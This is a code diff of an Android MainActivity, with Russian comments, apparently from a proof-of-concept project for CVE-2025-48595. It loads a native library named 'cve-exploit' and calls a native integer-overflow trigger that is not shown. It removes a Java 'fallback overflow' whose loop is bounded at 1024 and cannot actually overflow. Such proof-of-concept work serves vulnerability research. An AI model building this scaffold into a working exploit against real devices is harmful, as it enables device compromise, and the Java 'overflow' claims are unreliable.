@@ -6,53 +6,44 @@ import android.util.Log;
 import android.widget.Toast;
 
 public class MainActivity extends Activity {
+
     private static final String TAG = "CVE-2025-48595";
 
-    // Загружаем библиотеку android_poc (совпадает с project name в CMake)
+    // Подключение нативной библиотеки (имя файла .so должно совпадать)
     static {
-        System.loadLibrary("android_poc");
+        System.loadLibrary("cve-exploit");
     }
-
-    // Единственный нативный метод, который нам нужен сейчас
-    public native String triggerOverflowExploit(int sizeHint);
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-        Log.i(TAG, "=== APP STARTED ===");
+        Log.i(TAG, "App started. Initializing POC...");
 
-        // Вызываем C++ код с переполнением (передаём 0xFFFFFFFF как подсказку размера)
-        String result = triggerOverflowExploit(0xFFFFFFFF);
+        // Запуск уязвимости
+        triggerIntegerOverflow();
 
-        Log.i(TAG, "Результат из C++: " + result);
-        Toast.makeText(this, "Exploit Result: " + result, Toast.LENGTH_LONG).show();
+        Toast.makeText(this, "CVE-2025-48595 Triggered", Toast.LENGTH_LONG).show();
+    }
 
-        // Альтернативный Java-уровень POC (если нативный код не сработал)
+    private void triggerIntegerOverflow() {
         try {
-            triggerJavaOverflow();  // <-- Fallback через Java API
+            // 1. Вызываем нативный метод, где происходит реальное поведение памяти
+            triggerIntegerOverflowNative();
+
+            // 2. Дополнительная проверка в Java (опционально)
+            int maliciousValue = Integer.MAX_VALUE;
+
+            // Если значение передается в системный компонент, который ожидает size_t,
+            // но получает int, может произойти оверфлоу при приведении типов или умножении.
+            Log.i(TAG, "Java-side value: " + maliciousValue);
+
         } catch (Exception e) {
-            Log.e(TAG, "Java overflow failed: " + e.getMessage());
+            Log.e(TAG, "Exception during trigger: " + e.getMessage(), e);
+            // В реальном сценарии здесь может произойти падение процесса
         }
     }
 
-    private void triggerJavaOverflow() {
-        int maliciousValue = Integer.MAX_VALUE;  // Целевое значение для переполнения
-
-        android.content.Intent intent = new android.content.Intent();
-        intent.putExtra("malicious_data", maliciousValue);
-
-        int result = processMaliciousData(maliciousValue);
-        Log.i(TAG, "Java overflow triggered successfully, result=" + result);
-    }
-
-    private int processMaliciousData(int value) {
-        int[] buffer = new int[1024];
-
-        for (int i = 0; i < value && i < 1024; i++) {
-            buffer[i] = i;
-        }
-
-        return buffer[0];
-    }
+    // Декларация нативного метода
+    private native void triggerIntegerOverflowNative();
 }
